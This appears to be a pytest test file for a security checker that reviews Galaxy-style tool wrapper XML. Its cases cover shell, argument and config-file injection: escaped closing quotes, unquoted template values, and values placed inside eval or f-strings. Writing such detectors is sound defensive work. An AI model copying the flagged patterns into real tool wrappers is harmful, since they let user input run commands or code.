    report = review(tmp_path, "sh '$script'", CONFIG.format("<![CDATA[x='$no_quote' y='$no_quote']]>"))
    assert not any("can end in a backslash" in f.context for f in report.findings)


@pytest.mark.parametrize(
    "command,expected",
    [
        ('tool "$no_dq"', {("argument-injection", "low")}),
        # The first value escapes its closing quote; the second is then written unquoted.
        ('tool "$no_dq" "$no_dq"', {("argument-injection", "low"), ("shell-injection", "high")}),
        # Inside single quotes a backslash is an ordinary character.
        ("tool '$no_quote' '$no_quote'", set()),
        # The backslashes the template writes before quotes escape them on purpose.
        (
            '#set $t = $no_expansion.replace(\'"\', \'\\\\"\')\ntool "$t" "$t"',
            set(),
        ),
    ],
)
def test_value_after_an_escaped_closing_quote_in_the_command(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # The quotes keep the value inside the string, but eval runs the string.
        ("python '$script'", "color = eval('$no_quote')", {("configfile-injection", "high")}),
        ("python '$script'", "color = eval(f'$no_quote')", {("configfile-injection", "high")}),
        ("Rscript '$script'", "x <- eval(parse(text = '$no_quote'))", {("configfile-injection", "high")}),
        ("sh '$script'", 'eval "echo $letters"', set()),
        # literal_eval only reads literals.
        ("python '$script'", "color = ast.literal_eval('$no_quote')", set()),
        ("python '$script'", "color = '$no_quote'", set()),
    ],
)
def test_value_in_a_string_the_script_evaluates(tmp_path, command, content, expected):
    found = rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>")))
    assert found - {("configfile-injection", "low")} == expected


def test_braces_in_an_f_string_are_code(tmp_path):
    braces = (
        '<inputs><param name="p" type="text"><sanitizer><valid initial="string.printable">'
        '<remove value="&apos;"/><remove value="&quot;"/><remove value="\\"/></valid></sanitizer></param></inputs>'
    )
    path = os.path.join(tmp_path, "fstring.xml")
    for content, expected in [
        ("print(f\"No genes starting with '$p' found.\")", {("configfile-injection", "high")}),
        ("print(\"No genes starting with '$p' found.\")", set()),
    ]:
        with open(path, "w") as fh:
            fh.write(
                f'<tool id="f" name="f" version="1" profile="24.2"><command>python \'$script\'</command>'
                f'<configfiles><configfile name="script"><![CDATA[{content}]]></configfile></configfiles>{braces}</tool>'
            )
        assert rules(review_tool_source(get_tool_source(path))) == expected
